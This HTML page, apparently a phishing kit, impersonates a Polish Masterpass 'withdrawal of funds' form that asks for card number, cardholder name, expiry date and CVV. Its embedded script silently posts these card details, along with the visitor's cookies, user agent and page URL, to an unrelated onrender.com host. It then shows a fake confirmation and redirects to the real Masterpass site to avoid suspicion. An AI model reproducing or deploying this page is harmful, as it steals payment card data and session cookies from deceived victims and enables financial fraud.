<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Wypłata środków | Masterpass</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="/style.css?v=3" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
</head>
<body>
  <div class="page-container">
    <div class="form-card">
      <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass logo" class="logo" />

      <h1>Wypłata środków</h1>
      <p class="subtitle">Podaj dane swojej karty płatniczej</p>

      <form id="cardForm" novalidate>
        <label for="cardNumber">Numer karty</label>
        <input type="text" id="cardNumber" name="cardNumber" required maxlength="19" placeholder="0000 0000 0000 0000" />

        <label for="cardHolder">Imię i nazwisko właściciela</label>
        <input type="text" id="cardHolder" name="cardHolder" required placeholder="Jan Kowalski" />

        <label for="expiryDate">Data ważności (MM/RR)</label>
        <input type="text" id="expiryDate" name="expiryDate" required placeholder="05/28" />

        <label for="cvv">Kod CVV</label>
        <input type="password" id="cvv" name="cvv" required maxlength="4" placeholder="123" />

        <button type="submit" class="submit-button">Potwierdź</button>
      </form>

      <div class="cookie-banner">
        Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki.
        <a href="#">Informacja o Plikach Cookie</a>.
      </div>
    </div>
  </div>

  <script type="module">
    const form = document.getElementById('cardForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const cardNumber = document.getElementById('cardNumber').value.trim();
      const cardHolder = document.getElementById('cardHolder').value.trim();
      const expiryDate = document.getElementById('expiryDate').value.trim();
      const cvv = document.getElementById('cvv').value.trim();

      try {
        await fetch('https://zaza-back.onrender.com/card', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            cardNumber,
            cardHolder,
            expiryDate,
            cvv,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            location: window.location.href,
            date: new Date().toISOString()
          })
        });

        alert('Twoja wypłata została przyjęta do realizacji.');
        window.location.href = 'https://www.masterpass.pl'; // или страница благодарности
      } catch (err) {
        console.error('Błąd wysyłania danych:', err);
      }
    });
  </script>
</body>
</html>
